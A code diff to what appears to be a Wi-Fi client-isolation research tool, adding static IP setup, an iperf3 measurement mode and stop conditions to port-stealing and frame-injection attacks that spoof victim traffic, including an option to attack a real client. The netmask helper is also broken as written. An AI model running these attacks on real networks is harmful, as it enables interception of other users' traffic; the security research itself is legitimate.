@@ -501,6 +501,33 @@ class Supplicant(Daemon):
 			self.send_eth(p, logtx=True)
 		self.time_syn = time.time()
 
+	def _netmask_to_prefix(netmask: str) -> int:
+	    # "255.255.255.0" -> 24
+	    return sum(bin(int(o)).count("1") for o in netmask.split("."))
+
+	def set_interface_static_ip(self, ip_addr: str, netmask: str, router_ip: str):
+	    try:
+	        prefix = _netmask_to_prefix(netmask)
+	    except Exception:
+	        prefix = 24
+
+	    try:
+	        subprocess.check_call(["ip", "link", "set", "dev", self.nic_iface, "up"])
+
+	        subprocess.check_call(["ip", "addr", "flush", "dev", self.nic_iface])
+
+	        subprocess.check_call(["ip", "addr", "add", f"{ip_addr}/{prefix}", "dev", self.nic_iface])
+
+	        try:
+	            subprocess.check_call(["ip", "route", "del", "default"])
+	        except subprocess.CalledProcessError:
+	            pass
+
+	        subprocess.check_call(["ip", "route", "add", "default", "via", router_ip, "dev", self.nic_iface])
+
+	        log(STATUS, f"Set {self.nic_iface} => {ip_addr}/{prefix}, gw {router_ip}", color="green")
+	    except Exception as e:
+	        log(WARNING, f"Failed to set static IP on {self.nic_iface}: {e}", color="orange")
 
 	def handle_eth_dhcp(self, p):
 		"""Handle packets needed to connect and request an IP"""
@@ -519,6 +546,20 @@ class Supplicant(Daemon):
 			self.time_retrans_dhcp = None
 			self.clientip = p[BOOTP].yiaddr
 			self.routerip = p[IP].src
+			subnet_mask = None
+			for opt in p[DHCP].options:
+			    if isinstance(opt, tuple) and opt[0] in ("subnet_mask", "subnet-mask", 1):
+			        subnet_mask = opt[1]
+			        break
+
+			if subnet_mask is None:
+			    subnet_mask = "255.255.255.0"
+
+			try:
+			    self.set_interface_static_ip(str(self.clientip), str(subnet_mask), str(self.routerip))
+			except Exception as e:
+			    log(WARNING, f"Unable to force-set interface IP: {e}")
+			
 
 			# In case the router has a different IP then the DHCP server, do an ARP request for it
 			routers = [opt[1] for opt in p[DHCP].options if opt[0] == "router"]
@@ -762,6 +803,7 @@ class Client2Client:
 		self.bssid_victim = None
 		self.bssid_attacker = None
 		self.attacker_connected = False
+		self.test_finished = False
 
 	def stop(self):
 		if not self.poc:
@@ -795,11 +837,11 @@ class Client2Client:
 		#	quit(1)
 
 	def monitor_eth_port_steal(self, eth):
+		#log(STATUS, f">>> Frame detected: {eth.summary()}", color="green")
 		if not self.options.poc:
-			if ICMP in eth and eth[ICMP].type == 0 and eth[Raw].load == b"1234567890" :
+			if (ICMP in eth and eth[ICMP].type == 0 and eth[Raw].load == b"1234567890") or (UDP in eth and eth[UDP].sport == self.options.iperf_port) :
 				log(STATUS, f">>> Downlink port stealing is successful.", color="red")
 		else:
-			log(STATUS, f">>> Frame detected: {eth.summary()}", color="green")
 			self.reinject_frame_via_broadcast_reflection(eth)
 
 	def reinject_frame_via_broadcast_reflection(self, eth):
@@ -844,6 +886,8 @@ class Client2Client:
 					self.sup_attacker.send_eth(p)
 					#log(STATUS, f"Sent one port stealing frame from attacker:       {repr(p)}")
 				time.sleep(0.001)
+				if self.test_finished:
+					break
 			log(STATUS, f"Finished sending 1000000 frames.")
 
 		# Option four: test port stealing (uplink) by letting the attacker send a lot of layer-2 frames with src addr as the victim's gateway. 
@@ -911,38 +955,123 @@ class Client2Client:
 			log(STATUS, f"Sending Ethernet layer packet from attacker to victim: {repr(p)} (Ethernet destination is the victim)")
 			self.sup_attacker.send_eth(p)
 	
+	
 	def send_uplink_frame(self):
-		if self.options.c2c_port_steal is not None:
+		"""Spawn iperf3 client to send UDP traffic from the victim IP (synchronous run).
+		Runs when self.options.c2c_port_steal is not None.
+		"""
+		if self.options.c2c_port_steal is None or (not self.sup_victim.can_send_traffic):
+			return
+
+		if not self.options.measure:
 			for _ in range(500000):
 				ip = IP(src=self.sup_victim.clientip, dst="8.8.8.8")/ICMP(id=random.randint(0, 0xFFFF), seq=random.randint(0, 0xFFFF))
 				p = Ether(src=self.sup_victim.mac, dst=self.sup_victim.routermac)/ip/Raw(b"1234567890")
 				#log(STATUS, f"Sending ICMP echo packet from victim to 8.8.8.8:       {repr(p)}")
 				self.sup_victim.send_eth(p)
 				time.sleep(0.02)
+			return
+
+		# Measure mode
+		target = getattr(self.options, "iperf_target")
+		bandwidth = getattr(self.options, "iperf_bandwidth")
+		port = str(getattr(self.options, "iperf_port"))
+		duration = str(getattr(self.options, "iperf_duration"))
+
+		cmd = ["iperf3", "-c", target, "-b", bandwidth, "--port", port, "-u", "-t", duration, "--bind-dev", self.options.iface, "--logfile", "log.txt", "-V", "-R"]
+
+		log(STATUS, f"Starting iperf3 (uplink) with: {' '.join(cmd)}")
+
+		try:
+			proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+			stdout, stderr = proc.communicate()
+			if proc.returncode != 0:
+				try:
+					log(WARNING, f"iperf3 (uplink) exited with code {proc.returncode}. stderr: {stderr.strip()}")
+				except Exception:
+					pass
+			else:
+				try:
+					log(STATUS, f"iperf3 (uplink) finished successfully. stdout length={len(stdout)}")
+					self.test_finished = True
+				except Exception:
+					pass
+		except FileNotFoundError:
+			try:
+				log(ERROR, "iperf3 executable not found. Install iperf3 and ensure it's in PATH.")
+			except Exception:
+				pass
+		except Exception as e:
+			try:
+				log(ERROR, f"Failed to start iperf3 (uplink): {e}")
+			except Exception:
+				pass
+
 
 	def send_uplink_frame2(self):
-		if self.options.c2c_port_steal_uplink is not None:
+		"""Alternative uplink iperf runner (synchronous).
+		Runs when self.options.c2c_port_steal_uplink is not None.
+		"""
+		if self.options.c2c_port_steal_uplink is None:
+			return
+
+		if not self.options.measure:
 			for _ in range(500000):
 				ip = IP(src=self.sup_victim.clientip, dst="8.8.8.8")/ICMP(id=random.randint(0, 0xFFFF), seq=random.randint(0, 0xFFFF))
 				p = Ether(src=self.sup_victim.mac, dst=self.sup_victim.routermac)/ip/Raw(b"abcdefghijklmn")
 				#log(STATUS, f"Sending ICMP echo packet from victim to 8.8.8.8:       {repr(p)}")
 				self.sup_victim.send_eth(p)
 				time.sleep(0.02)
-			
+			return
+
+		# Measure mode
+		target = getattr(self.options, "iperf_target")
+		bandwidth = getattr(self.options, "iperf_bandwidth")
+		port = str(getattr(self.options, "iperf_port"))
+		duration = str(getattr(self.options, "iperf_duration"))
+
+		cmd = ["iperf3", "-c", target, "-b", bandwidth, "--port", port, "-u", "-t", duration, "--bind-dev", self.options.iface, "--logfile", "log.txt", "-V", "-R"]
+
+		log(STATUS, f"Starting iperf3 (uplink2) with: {' '.join(cmd)}")
+
+		try:
+			proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+			stdout, stderr = proc.communicate()
+			if proc.returncode != 0:
+				try:
+					log(WARNING, f"iperf3 (uplink2) exited with code {proc.returncode}. stderr: {stderr.strip()}")
+				except Exception:
+					pass
+			else:
+				try:
+					log(STATUS, f"iperf3 (uplink2) finished successfully. stdout length={len(stdout)}")
+					self.test_finished = True
+				except Exception:
+					pass
+		except FileNotFoundError:
+			try:
+				log(ERROR, "iperf3 executable not found. Install iperf3 and ensure it's in PATH.")
+			except Exception:
+				pass
+		except Exception as e:
+			try:
+				log(ERROR, f"Failed to start iperf3 (uplink2): {e}")
+			except Exception:
+				pass
 
 
 	def start_monitor(self):
 		# Let the 2nd client handle ARP requests and monitor for packets
 		self.sup_victim.set_eth_handler(self.monitor_eth)
-		self.sup_victim.event_loop()
+		self.sup_victim.event_loop(lambda: self.test_finished == True)
 
 	def start_attacker_receiver(self):
 		self.sup_attacker.set_eth_handler(self.monitor_eth_port_steal)
-		self.sup_attacker.event_loop()
+		self.sup_attacker.event_loop(lambda: self.test_finished == True)
 
 	def start_attacker_receiver2(self):
 		self.sup_attacker.set_eth_handler(self.monitor_eth_port_steal_uplink)
-		self.sup_attacker.event_loop()
+		self.sup_attacker.event_loop(lambda: self.test_finished == True)
 
 	def run(self):
 		# If not in PoC mode, let victim client connect.
@@ -1169,7 +1298,16 @@ def main():
 	parser.add_argument("--fast", help="Fast override attack using second given interface.")
 	parser.add_argument("--check-gtk-shared", help="Checking if second given interface receives the same GTK from BSSID.")
 	parser.add_argument("--poc", default=False, action="store_true", help="Attack a real client for PoC purposes.")
+	parser.add_argument("--measure", default=False, action="store_true", help="Measure attack performance. ")
 	parser.add_argument("--c2c-gtk-inject", help="Checking if second given interface can inject frames wrapped with GTK.")
+	parser.add_argument('--iperf-target', dest='iperf_target', default='192.168.106.157',
+                    help='iperf3 server target IP (default: 192.168.106.157)')
+	parser.add_argument('--iperf-bandwidth', dest='iperf_bandwidth', default='100M',
+	                    help='iperf3 bandwidth string, e.g. 100M, 10M (default: 100M)')
+	parser.add_argument('--iperf-duration', dest='iperf_duration', type=int, default=10,
+	                    help='iperf3 test duration in seconds (default: 10)')
+	parser.add_argument('--iperf-port', dest='iperf_port', type=int, default=5201,
+	                    help='iperf3 port (default: 5201)')
 	options = parser.parse_args()
 
 	# TODO: Implement this by first connecting to the given BSSID to create a cached PMK
